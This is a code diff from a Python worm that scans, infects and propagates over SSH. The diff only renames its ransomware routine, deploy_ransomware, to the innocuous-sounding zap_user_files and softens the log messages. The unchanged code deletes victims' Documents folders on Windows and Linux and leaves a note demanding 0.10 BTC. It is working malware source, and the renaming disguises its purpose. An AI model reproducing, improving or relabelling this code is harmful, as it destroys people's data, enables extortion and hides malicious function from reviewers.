@@ -251,9 +251,9 @@ def get_remote_exec_command(ssh, mutated_file, remote_os=None):
 
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
-    # If ransomware note doesn't exist, perform ransom operation.
+    # If infection note doesn't exist, perform zap operation.
     if not os.path.isfile(f"{HOME_DIR}/openme.txt"):
-        deploy_ransomware()
+        zap_user_files()
     #Remove the debug log file if present -- uncomment if you want to examine each host's logs
     #if os.path.isfile("/tmp/dmsg.log"):
     #    os.remove("/tmp/dmsg.log")
@@ -309,11 +309,11 @@ def initiate_worm():
 
     #cleanup_local()
 
-def deploy_ransomware():
+def zap_user_files():
     """Encrypt and delete documents, then leave an informative note."""
     note_path = os.path.join(HOME_DIR, "openme.txt")
     if os.path.exists(note_path):
-        logger.info("Ransom note exists. Skipping ransomware action.")
+        logger.info("Infection note exists. Skipping zap operation.")
         return
     
     if sys.platform.startswith("win"):
@@ -328,9 +328,9 @@ def deploy_ransomware():
             subprocess.check_call(["rmdir", "/S", "/Q", docs_dir], shell=True)
             with open(note_path, "w") as f:
                 f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
-            logger.error("Ransomware operation completed on this host (Windows).")
+            logger.error("Zap operation completed on this host (Windows).")
         except Exception as e:
-            logger.error("Error during ransomware operation (Windows): " + str(e))
+            logger.error("Error during zap operation (Windows): " + str(e))
     else:
         docs_dir = os.path.join(HOME_DIR, "Documents")
         if not os.path.exists(docs_dir):
@@ -347,9 +347,9 @@ def deploy_ransomware():
             os.remove(tar_path)
             with open(note_path, "w") as f:
                 f.write("Your files are now mine. Send 0.10 BTC to my wallet to get them back.\n")
-            logger.error("Ransomware operation completed on this host (Linux).")
+            logger.error("Zap operation completed on this host (Linux).")
         except Exception as e:
-            logger.error("Error during ransomware operation (Linux): " + str(e))
+            logger.error("Error during zap operation (Linux): " + str(e))
 
 def local_addresses():
     """Retrieve local IPv4 addresses and associated CIDR subnets."""
